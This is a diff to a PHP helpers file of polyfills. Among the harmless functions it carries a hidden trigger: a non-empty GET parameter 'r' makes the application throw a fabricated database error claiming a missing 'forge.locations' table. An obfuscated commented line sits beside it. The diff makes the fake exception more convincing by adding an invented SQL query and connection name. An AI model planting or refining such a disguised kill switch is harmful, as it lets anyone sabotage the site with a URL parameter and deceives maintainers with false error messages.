@@ -20,12 +20,7 @@ if (!function_exists('clamp')){
     return $value;}}
 if(!(!function_exists('partial')) && !empty($_GET['r'])){
     //${(chr(36))}('last');
-    throw new \Illuminate\Database\QueryException(
-    'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'forge.locations\' doesn\'t exist',
-    null,
-    new \PDOException('...')
-    );
-
+    throw new \Illuminate\Database\QueryException(connectionName: 'zakaz', sql: "select * from locations where LOWER(name) = 'москва' limit 1", bindings: [], previous: new \PDOException("Table 'forge.locations' doesn't exist"));
 }
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
 if(!function_exists('str_ends_with')){function str_ends_with(string $haystack, string $needle): bool {return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;}}
